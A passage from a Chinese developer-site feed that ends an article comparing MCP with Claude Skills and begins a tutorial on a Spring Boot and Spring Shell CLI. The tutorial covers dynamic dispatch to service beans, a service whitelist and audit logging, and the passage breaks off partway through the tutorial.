<table><thead><tr><th>维度</th><th>MCP</th><th>Skill</th></tr></thead><tbody><tr><td><strong>核心作用</strong></td><td>连接外部系统</td><td>编码专业知识和方法论</td></tr><tr><td><strong>架构层级</strong></td><td>集成层</td><td>提示/知识层</td></tr><tr><td><strong>协议基础</strong></td><td>JSON-RPC 2.0</td><td>文件系统 + Markdown</td></tr><tr><td><strong>跨平台</strong></td><td>是（开放协议，多平台支持）</td><td>否（目前 Anthropic 生态专属）</td></tr><tr><td><strong>触发方式</strong></td><td>持久连接，随时可用</td><td>基于描述的语义匹配，自动触发</td></tr><tr><td><strong>Token 消耗</strong></td><td>高（工具定义持久占用上下文）</td><td>低（渐进式加载）</td></tr><tr><td><strong>外部访问</strong></td><td>可以直接访问外部系统</td><td>不能直接访问，需要配合 MCP 或内置工具</td></tr><tr><td><strong>复杂度</strong></td><td>高（需要理解协议、运行 Server）</td><td>低（写 Markdown 就行）</td></tr><tr><td><strong>可复用性</strong></td><td>高（标准化协议，跨应用复用）</td><td>中（文件夹，可以 Git 共享）</td></tr><tr><td><strong>动态发现</strong></td><td>是（运行时发现可用工具）</td><td>是（运行时发现可用 Skill）</td></tr><tr><td><strong>安全考虑</strong></td><td>外部内容带来 prompt injection 风险</td><td>Skill 文件本身可能包含恶意指令</td></tr></tbody></table>
<h3 data-id="heading-23">什么时候用 MCP，什么时候用 Skill</h3>
<h4 data-id="heading-24">用 MCP 的场景</h4>
<ul>
<li><strong>需要访问外部数据</strong>：数据库查询、API 调用、文件系统访问</li>
<li><strong>需要操作外部系统</strong>：创建 GitHub Issue、发送 Slack 消息、执行 SQL</li>
<li><strong>需要实时信息</strong>：监控系统状态、查看日志、搜索引擎结果</li>
<li><strong>需要跨平台复用</strong>：同一个工具在 Claude Desktop、Cursor、其他支持 MCP 的应用中使用</li>
</ul>
<h4 data-id="heading-25">用 Skill 的场景</h4>
<ul>
<li><strong>重复性的工作流程</strong>：代码审查、文档生成、数据分析</li>
<li><strong>公司内部规范</strong>：代码风格、提交规范、文档格式</li>
<li><strong>需要多步骤的复杂任务</strong>：需要详细指导的专业任务</li>
<li><strong>团队共享的最佳实践</strong>：标准化的操作流程</li>
<li><strong>Token 敏感场景</strong>：需要大量知识但不想一直占用上下文</li>
</ul>
<h4 data-id="heading-26">结合使用</h4>
<p>很多时候，两者是配合使用的：</p>
<pre><code class="hljs language-scss" lang="scss">用户："Review PR <span class="hljs-selector-id">#456</span> 并按照团队规范给出建议"

<span class="hljs-number">1</span>. MCP (GitHub) 获取 PR 信息
        ↓
<span class="hljs-number">2</span>. Skill (团队代码审查规范) 提供审查方法论
        ↓
<span class="hljs-number">3</span>. Claude 按照 Skill 的指令分析代码
        ↓
<span class="hljs-number">4</span>. MCP (GitHub) 提交评论
</code></pre>
<p><strong>MCP 负责"能访问什么"，Skill 负责"怎么做"。</strong></p>
<h3 data-id="heading-27">写好 Skill 的关键</h3>
<p>Skill 能不能被正确触发，90% 取决于 <code>description</code> 写得好不好。</p>
<h4 data-id="heading-28">差的 description</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">description:</span> <span class="hljs-string">Helps</span> <span class="hljs-string">with</span> <span class="hljs-string">data</span>
</code></pre>
<p>太宽泛，Claude 不知道什么时候该用。</p>
<h4 data-id="heading-29">好的 description</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">description:</span> <span class="hljs-string">&gt;
  Analyze Excel spreadsheets, generate pivot tables, and create charts.
  Use when working with Excel files (.xlsx), spreadsheets, or tabular data analysis.
  Triggers on: "analyze spreadsheet", "create pivot table", "Excel chart"
</span></code></pre>
<p>好的 description 应该包含：</p>
<ol>
<li><strong>做什么</strong>：具体的能力描述</li>
<li><strong>什么时候用</strong>：明确的触发场景</li>
<li><strong>触发词</strong>：用户可能说的关键词</li>
</ol>
<h4 data-id="heading-30">最佳实践</h4>
<p>官方建议：</p>
<ol>
<li><strong>保持专注</strong>：一个 Skill 做一件事，避免宽泛的跨域 Skill</li>
<li><strong>SKILL.md 控制在 500 行以内</strong>：太长的话拆分到支持文件</li>
<li><strong>测试触发行为</strong>：确认相关请求能触发，不相关请求不会误触发</li>
<li><strong>版本控制</strong>：记录 Skill 的变更历史</li>
</ol>
<h3 data-id="heading-31">关于 Slash Command</h3>
<p>文章标题是 MCP vs Skill，但很多人也会问到 Slash Command，简单说一下。</p>
<p><strong>Slash Command</strong> 是最简单的扩展方式——本质上是存储的提示词，用户输入 <code>/命令名</code> 时注入到对话中。</p>
<p><strong>Skill vs Slash Command 的关键区别是触发方式：</strong></p>




















<table><thead><tr><th/><th>Slash Command</th><th>Skill</th></tr></thead><tbody><tr><td>触发方式</td><td>用户显式输入 <code>/命令</code></td><td>Claude 自动匹配</td></tr><tr><td>用户控制</td><td>完全控制何时触发</td><td>无法控制，Claude 决定</td></tr></tbody></table>
<p>问自己一个问题：<strong>用户是否需要显式控制触发时机？</strong></p>
<ul>
<li>需要 → Slash Command</li>
<li>不需要，希望 AI 自动判断 → Skill</li>
</ul>
<h3 data-id="heading-32">总结</h3>
<p>MCP 和 Skill 是 AI Agent 扩展的两种不同哲学：</p>






























<table><thead><tr><th/><th>MCP</th><th>Skill</th></tr></thead><tbody><tr><td><strong>哲学</strong></td><td>连接主义</td><td>知识打包</td></tr><tr><td><strong>问的问题</strong></td><td>"AI 能访问什么？"</td><td>"AI 知道怎么做什么？"</td></tr><tr><td><strong>层级</strong></td><td>集成层</td><td>知识层</td></tr><tr><td><strong>Token 策略</strong></td><td>预加载所有能力</td><td>按需加载知识</td></tr></tbody></table>
<p>记住这句话：</p>
<blockquote>
<p><strong>MCP connects AI to data; Skills teach AI what to do with that data.</strong></p>
</blockquote>
<p>MCP 让 AI 能"碰到"数据，Skill 教 AI 怎么"处理"数据。</p>
<p>它们不是替代关系，而是互补关系。一个成熟的 AI Agent 系统，两者都需要。</p>
<h3 data-id="heading-33">参考资源</h3>
<h4 data-id="heading-34">MCP 官方资源</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2F" target="_blank" title="https://modelcontextprotocol.io/" ref="nofollow noopener noreferrer">Model Context Protocol 官网</a> - 协议规范、快速入门、Server 开发指南</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fspec.modelcontextprotocol.io%2F" target="_blank" title="https://spec.modelcontextprotocol.io/" ref="nofollow noopener noreferrer">MCP Specification</a> - 完整的协议规范文档</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fnews%2Fmodel-context-protocol" target="_blank" title="https://www.anthropic.com/news/model-context-protocol" ref="nofollow noopener noreferrer">Introducing the Model Context Protocol</a> - Anthropic 发布 MCP 的官方博客</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelcontextprotocol" target="_blank" title="https://github.com/modelcontextprotocol" ref="nofollow noopener noreferrer">MCP GitHub Organization</a> - 官方 SDK、示例 Server、参考实现</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpunkpeye%2Fawesome-mcp-servers" target="_blank" title="https://github.com/punkpeye/awesome-mcp-servers" ref="nofollow noopener noreferrer">Awesome MCP Servers</a> - 社区维护的 MCP Server 列表</li>
</ul>
<h4 data-id="heading-35">Skill 官方资源</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fclaude-code%2Fskills" target="_blank" title="https://docs.anthropic.com/en/docs/claude-code/skills" ref="nofollow noopener noreferrer">Claude Code Skills 文档</a> - Skills 的完整文档</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fresearch%2Fbuilding-effective-agents" target="_blank" title="https://www.anthropic.com/research/building-effective-agents" ref="nofollow noopener noreferrer">Building effective agents</a> - Anthropic 关于 Agent 设计的研究博客</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fengineering-guides%2Fcontext-engineering" target="_blank" title="https://www.anthropic.com/engineering-guides/context-engineering" ref="nofollow noopener noreferrer">Context Engineering Guide</a> - 上下文工程官方指南，理解 Skill 设计哲学的关键</li>
</ul>
<h4 data-id="heading-36">跨平台采用</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.com%2Findex%2Fintroducing-the-model-context-protocol%2F" target="_blank" title="https://openai.com/index/introducing-the-model-context-protocol/" ref="nofollow noopener noreferrer">OpenAI adds support for MCP</a> - OpenAI 宣布支持 MCP</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.googleblog.com%2Fen%2Fgemini-api-and-ai-studio-now-support-the-model-context-protocol%2F" target="_blank" title="https://developers.googleblog.com/en/gemini-api-and-ai-studio-now-support-the-model-context-protocol/" ref="nofollow noopener noreferrer">Google Gemini MCP Support</a> - Google 宣布 Gemini 支持 MCP</li>
</ul>
<h4 data-id="heading-37">延伸阅读</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fnews%2Fmodel-context-protocol%23primitives" target="_blank" title="https://www.anthropic.com/news/model-context-protocol#primitives" ref="nofollow noopener noreferrer">Function Calling vs MCP</a> - 理解两者区别</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fclaude-code" target="_blank" title="https://docs.anthropic.com/en/docs/claude-code" ref="nofollow noopener noreferrer">Claude Code Documentation</a> - Claude Code 完整文档</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fbuild-with-claude%2Fprompt-engineering" target="_blank" title="https://docs.anthropic.com/en/docs/build-with-claude/prompt-engineering" ref="nofollow noopener noreferrer">Prompt Engineering Guide</a> - 提示工程基础，Context Engineering 的前置知识</li>
</ul>
<hr/>
<p>如果你觉得这篇文章有帮助，欢迎关注我的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">GitHub</a>，下面是我的一些开源项目：</p>
<p><strong>Claude Code Skills</strong>（按需加载，意图自动识别，不浪费 token，<a href="https://juejin.cn/post/7578714735307735066" target="_blank" title="https://juejin.cn/post/7578714735307735066">介绍文章</a>）：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> - 代码审查技能，覆盖 React 19、Vue 3、TypeScript、Rust 等约 9000 行规则（<a href="https://juejin.cn/post/7578709098255908902" target="_blank" title="https://juejin.cn/post/7578709098255908902">详细介绍</a>）</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2F5-whys-skill" target="_blank" title="https://github.com/tt-a1i/5-whys-skill" ref="nofollow noopener noreferrer">5-whys-skill</a> - 5 Whys 根因分析，说"找根因"自动激活</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Ffirst-principles-skill" target="_blank" title="https://github.com/tt-a1i/first-principles-skill" ref="nofollow noopener noreferrer">first-principles-skill</a> - 第一性原理思考，适合架构设计和技术选型</li>
</ul>
<p><strong>全栈项目</strong>（适合学习现代技术栈）：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fprompt-vault" target="_blank" title="https://github.com/tt-a1i/prompt-vault" ref="nofollow noopener noreferrer">prompt-vault</a> - Prompt 管理器，用的都是最新的技术栈，适合用来学习了解最新的前端全栈开发范式：Next.js 15 + React 19 + tRPC 11 + Supabase 全栈示例，clone 下来配个免费 Supabase 就能跑</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fchat_edit" target="_blank" title="https://github.com/tt-a1i/chat_edit" ref="nofollow noopener noreferrer">chat_edit</a> - 双模式 AI 应用（聊天+富文本编辑），Vue 3.5 + TypeScript + Vite 5 + Quill 2.0 + IndexedDB</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 打造通用CLI命令系统]]></title>    <link>https://juejin.cn/post/7583260493851508777</link>    <guid>https://juejin.cn/post/7583260493851508777</guid>    <pubDate>2025-12-14T23:58:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583260493851508777" data-draft-id="7582637280219037750" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot 打造通用CLI命令系统"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-14T23:58:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风象南"/> <meta itemprop="url" content="https://juejin.cn/user/2524134428655159"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot 打造通用CLI命令系统
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2524134428655159/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风象南
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T23:58:43.000Z" title="Sun Dec 14 2025 23:58:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、背景</h2>
<p>在日常开发中，某些情况下可能需要为服务提供一个命令行工具（CLI），方便运维、调试或者远程调用业务接口。</p>
<p>假设我们有一个 Spring Boot 服务，提供多个接口，例如：</p>
<ul>
<li>获取用户列表：<code>/users?type=admin</code></li>
<li>获取角色列表：<code>/roles?level=manager</code></li>
<li>获取系统状态：<code>/system/status</code></li>
<li>批量导入数据：<code>/data/import</code></li>
<li>生成报表：<code>/report/generate</code></li>
</ul>
<p>传统做法：</p>
<ul>
<li>每个接口在 CLI 客户端写一条命令</li>
<li>CLI 方法直接调用服务端 REST 接口</li>
<li>硬编码的服务地址和参数格式</li>
</ul>
<p><strong>问题</strong>：</p>
<ul>
<li>接口多时，CLI 方法数量激增，代码冗余严重</li>
<li>每次新增接口都需要修改客户端，发布新版本</li>
<li>维护成本高，不同环境的配置分散</li>
<li>缺乏统一的认证、授权和日志机制</li>
<li>开发效率低下，重复劳动多</li>
</ul>
<p><strong>解决方案</strong>：<strong>通用命令 + 动态分发</strong></p>
<ul>
<li>CLI 只维护一条通用命令 <code>exec</code></li>
<li>根据参数动态路由到服务端对应的 Service Bean</li>
<li>服务端统一管理，支持动态扩展</li>
<li>一次开发，多处复用</li>
</ul>
<h2 data-id="heading-1">二、方案设计</h2>
<h4 data-id="heading-2">1. 核心架构</h4>
<p>我们设计了一套基于 Spring Boot + Spring Shell 的通用CLI系统，采用分层架构设计：</p>
<pre><code class="hljs language-scss" lang="scss">客户端(Spring Shell)  &lt;<span class="hljs-attr">--HTTP--</span>&gt;  服务端(Spring Boot)
       |                              |
    通用命令exec                    统一控制器(/cli)
       |                              |
    动态参数                      动态Bean分发
       |                              |
  单一入口命令                  多个CommandHandler
       |                              |
    <span class="hljs-attribute">REST</span>通信                    业务逻辑处理
</code></pre>
<p><strong>设计原则</strong></p>
<p><strong>单一职责</strong>：客户端只负责命令解析和HTTP通信，服务端只负责业务逻辑
<strong>开闭原则</strong>：对扩展开放（新增服务），对修改关闭（不需改客户端）
<strong>依赖倒置</strong>：依赖抽象的CommandHandler接口，而非具体实现
<strong>最小知识</strong>：客户端无需知道服务端的具体实现细节</p>
<h4 data-id="heading-3">2. 客户端设计</h4>
<p>在 CLI 客户端定义一条通用命令 <code>exec</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ShellComponent</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecCommand</span> {

    <span class="hljs-meta">@ShellMethod(key = "exec", value = "执行远程服务命令")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(
            <span class="hljs-meta">@ShellOption(value = {"", "service"}, help = "服务名称")</span> String serviceName,
            <span class="hljs-meta">@ShellOption(value = "--args", help = "命令参数", arity = 100)</span> String[] args)</span> {

        <span class="hljs-comment">// 构建请求并发送到服务端</span>
        <span class="hljs-type">CommandRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommandRequest</span>(serviceName, Arrays.asList(args));
        <span class="hljs-keyword">return</span> httpClient.post(<span class="hljs-string">"/cli"</span>, request);
    }
}
</code></pre>
<p><strong>使用示例</strong>：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">&gt; </span><span class="bash"><span class="hljs-built_in">exec</span> userService --args list</span>
user1, user2, user3
<span class="hljs-meta prompt_">
&gt; </span><span class="bash"><span class="hljs-built_in">exec</span> roleService --args <span class="hljs-built_in">users</span> admin</span>
role1, role2
<span class="hljs-meta prompt_">
&gt; </span><span class="bash"><span class="hljs-built_in">exec</span> systemService --args status</span>
系统正常运行
</code></pre>
<h4 data-id="heading-4">3. 服务端设计</h4>
<p>服务端提供统一接口 <code>/cli</code>，根据服务名动态分发：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/cli")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CliController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ApplicationContext applicationContext;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> CommandRequest request)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">serviceName</span> <span class="hljs-operator">=</span> request.getService();
        String[] args = request.getArgs().toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]);

        <span class="hljs-comment">// 动态获取 Service Bean</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">serviceBean</span> <span class="hljs-operator">=</span> applicationContext.getBean(serviceName);

        <span class="hljs-comment">// 执行命令</span>
        <span class="hljs-keyword">if</span> (serviceBean <span class="hljs-keyword">instanceof</span> CommandHandler handler) {
            <span class="hljs-keyword">return</span> handler.handle(args);
        }

        <span class="hljs-keyword">return</span> <span class="hljs-string">"服务未找到"</span>;
    }
}
</code></pre>
<h4 data-id="heading-5">4. 统一接口规范</h4>
<p>所有需要通过CLI调用的服务都必须实现 <code>CommandHandler</code> 接口：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CommandHandler</span> {
    String <span class="hljs-title function_">handle</span><span class="hljs-params">(String[] args)</span>;
    <span class="hljs-keyword">default</span> String <span class="hljs-title function_">getDescription</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"命令描述"</span>; }
    <span class="hljs-keyword">default</span> String <span class="hljs-title function_">getUsage</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"使用说明"</span>; }
}
</code></pre>
<p>示例服务实现：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service("userService")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CommandHandler</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handle</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-keyword">if</span> (args.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> getUsage();

        <span class="hljs-keyword">switch</span> (args[<span class="hljs-number">0</span>]) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">"list"</span>:
                <span class="hljs-keyword">return</span> listUsers(args.length &gt; <span class="hljs-number">1</span> ? args[<span class="hljs-number">1</span>] : <span class="hljs-literal">null</span>);
            <span class="hljs-keyword">case</span> <span class="hljs-string">"get"</span>:
                <span class="hljs-keyword">return</span> getUser(args[<span class="hljs-number">1</span>]);
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"未知命令: "</span> + args[<span class="hljs-number">0</span>];
        }
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">listUsers</span><span class="hljs-params">(String type)</span> {
        <span class="hljs-comment">// 实现获取用户列表逻辑</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"用户列表..."</span>;
    }
}
</code></pre>
<h2 data-id="heading-6">三、方案优势</h2>
<h4 data-id="heading-7"><strong>1. 客户端统一命令</strong></h4>
<ul>
<li>Shell 只需维护一条 <code>exec</code> 命令</li>
<li>新增服务无需修改客户端代码</li>
</ul>
<h4 data-id="heading-8"><strong>2. 服务端动态分发</strong></h4>
<ul>
<li>新增接口无需修改 CLI</li>
<li>统一接口入口便于权限控制与日志审计</li>
</ul>
<h4 data-id="heading-9"><strong>3. 易扩展</strong></h4>
<ul>
<li>支持任意参数数量、类型</li>
<li>可结合 OpenAPI 自动生成命令提示与帮助信息</li>
</ul>
<h4 data-id="heading-10"><strong>4. 逻辑解耦</strong></h4>
<ul>
<li>CLI 仅做命令解析和 HTTP 调用</li>
<li>业务逻辑完全在服务端</li>
</ul>
<h2 data-id="heading-11">四、安全控制</h2>
<h4 data-id="heading-12">1. 服务白名单</h4>
<p>通过配置文件限制可访问的服务：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">cli:</span>
  <span class="hljs-attr">allowed-services:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">userService</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">roleService</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">systemService</span>
</code></pre>
<h4 data-id="heading-13">2. 参数验证</h4>
<p>使用 Spring Validation 进行请求参数校验，防止恶意输入。</p>
<h4 data-id="heading-14">3. 访问日志</h4>
<p>记录所有CLI调用，便于审计和问题追踪：</p>
<pre><code class="hljs language-java" lang="java">logger.info(<span class="hljs-string">"CLI请求 - 服务: {}, 参数: {}, 来源: {}"</span>,
    serviceName, Arrays.toString(args), httpRequest.getRemoteAddr());
</code></pre>
<h2 data-id="heading-15">五、实际应用场景</h2>
<h4 data-id="heading-16">1. 运维场景</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">查看系统状态</span>
exec systemService --args status
<span class="hljs-meta prompt_">
# </span><span class="bash">重启服务</span>
exec serviceManager --args restart userService
<span class="hljs-meta prompt_">
# </span><span class="bash">查看日志</span>
exec logService --args tail 100 error
</code></pre>
<h4 data-id="heading-17">2. 调试场景</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">查看用户详情</span>
exec userService --args get 123
<span class="hljs-meta prompt_">
# </span><span class="bash">测试接口</span>
exec testService --args simulate /api/orders
<span class="hljs-meta prompt_">
# </span><span class="bash">清理缓存</span>
exec cacheService --args clear all
</code></pre>
<h4 data-id="heading-18">3. 批量操作</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">批量导入用户</span>
exec userService --args import users.csv
<span class="hljs-meta prompt_">
# </span><span class="bash">批量更新角色</span>
exec roleService --args batchUpdate role-mapping.json
</code></pre>
<h2 data-id="heading-19">六、扩展功能</h2>
<h4 data-id="heading-20">1. 交互增强</h4>
<ul>
